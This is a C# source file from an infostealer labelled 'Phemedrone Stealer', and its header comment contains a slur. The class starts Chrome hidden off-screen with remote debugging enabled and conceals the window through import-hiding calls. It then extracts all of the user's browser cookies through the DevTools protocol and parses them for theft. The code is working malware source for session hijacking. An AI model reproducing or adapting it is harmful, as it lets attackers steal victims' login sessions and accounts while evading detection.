/*
    Phemedrone Stealer
    !WARNING! whoever copy+pastes this code is gay !WARNING!
*/

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Threading;
using Phemedrone.Extensions;
using PhemedroneStealer.Extensions;

namespace Phemedrone.Classes;

public class ChromeDevToolsWrapper
{
    private Process _chromeProcess;
    
    private delegate bool ShowWindow(IntPtr hWnd, int nCmdShow);
    private delegate IntPtr GetForegroundWindow();
    private delegate bool SetForegroundWindow(IntPtr hWnd);
    
    const int SW_HIDE = 0; // Command to hide the window
    public ChromeDevToolsWrapper(string executablePath, string profileName)
    {
        var startInfo = new ProcessStartInfo
        {
            FileName = executablePath,
            Arguments = $"--window-position=-2400,-2400 --remote-debugging-port=9222 --profile-directory=\"{profileName}\"",
            CreateNoWindow = true,
            UseShellExecute = false,
        };
        
        var getForegroundWindow = ImportHider.HiddenCallResolve<GetForegroundWindow>("user32.dll", "GetForegroundWindow");
        var foregroundWindowHandle = getForegroundWindow();
        
        _chromeProcess = Process.Start(startInfo); // starting chrome
        
        Thread.Sleep(300);
        if (foregroundWindowHandle != IntPtr.Zero)
        {
            var setForegroundWindow = ImportHider.HiddenCallResolve<SetForegroundWindow>("user32.dll", "SetForegroundWindow");
            setForegroundWindow(foregroundWindowHandle);
        }

        var showWindow = ImportHider.HiddenCallResolve<ShowWindow>("user32.dll", "ShowWindow");
        showWindow(_chromeProcess!.MainWindowHandle, SW_HIDE);
    }

    public List<Cookie> ExtractCookies()
    {
        var path = ExtractWebsocketUrl();

        var cookies = new List<Cookie>();
        string jsonCookies;
        
        using(var client = new WebSocketClient("localhost", 9222))
        {
            if (!client.Handshake(path))
                return cookies;
            
            client.SendMessage("{\"id\":1,\"method\":\"Network.getAllCookies\",\"params\":{}}"); // send command to get cookies
            
            jsonCookies = client.ReceiveMessage(); // receive cookies
        }
        
        _chromeProcess.Kill();

        
        return Parse(jsonCookies);
    }

    private string ExtractWebsocketUrl()
    {
        var parser = new JsonParser();
        using var client = new WebClient();
        
        var json = client.DownloadString("http://localhost:9222/json");
        
        return parser.ParseStringV2("webSocketDebuggerUrl", json).Substring(19); // skipping ws://localhost:9222
    }

    // mega parser
    private static List<Cookie> Parse(string jsonString)
    {
        var cookiesStartIndex = jsonString.IndexOf("\"cookies\":", StringComparison.Ordinal) + 10;
        var cookiesEndIndex = jsonString.IndexOf("]}", cookiesStartIndex, StringComparison.Ordinal) + 1;
        var cookiesString = jsonString.Substring(cookiesStartIndex, cookiesEndIndex - cookiesStartIndex);

        var cookieItems = cookiesString.Split(new[] { "},{" }, StringSplitOptions.None);

        return (from cookie in cookieItems
            select cookie.Replace("{", "").Replace("}", "").Replace("[", "").Replace("]", "")
            into cookieCleaned
            let name = ExtractValue(cookieCleaned, "\"name\":\"", "\"")
            let value = ExtractValue(cookieCleaned, "\"value\":\"", "\"")
            let domain = ExtractValue(cookieCleaned, "\"domain\":\"", "\"")
            let path = ExtractValue(cookieCleaned, "\"path\":\"", "\"")
            let expires = ExtractValue(cookieCleaned, "\"expires\":", ",").Split('.').First() + "000" // fixes expires 
            let secure = ExtractValue(cookieCleaned, "\"secure\":", ",")
            let httpOnly = ExtractValue(cookieCleaned, "\"httpOnly\":", ",")
            select new Cookie
            {
                Name = name,
                Domain = domain,
                Expires = expires,
                Path = path,
                Value = value,
                Secure = secure,
                HttpOnly = httpOnly
            }).ToList();
    }
    static string ExtractValue(string source, string startMarker, string endMarker)
    {
        var startIndex = source.IndexOf(startMarker, StringComparison.Ordinal);
        if (startIndex == -1) return "";
        startIndex += startMarker.Length;
        var endIndex = source.IndexOf(endMarker, startIndex, StringComparison.Ordinal);
        return endIndex == -1 ? "" : source.Substring(startIndex, endIndex - startIndex);
    }
}